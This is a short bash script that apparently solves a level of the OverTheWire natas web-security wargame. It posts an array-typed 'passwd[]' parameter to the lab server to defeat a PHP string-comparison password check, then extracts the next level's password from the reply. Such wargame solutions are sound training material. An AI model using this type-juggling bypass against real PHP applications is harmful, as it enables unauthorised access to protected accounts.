#!/bin/bash
if [ $# -eq 0 ] ; then
  echo "Please pass the password as argument"
  exit
fi
curl -s --user natas24:$1 --data "passwd[]=11iloveyou" http://natas24.natas.labs.overthewire.org/ | grep -E -o "Password: .{32}"
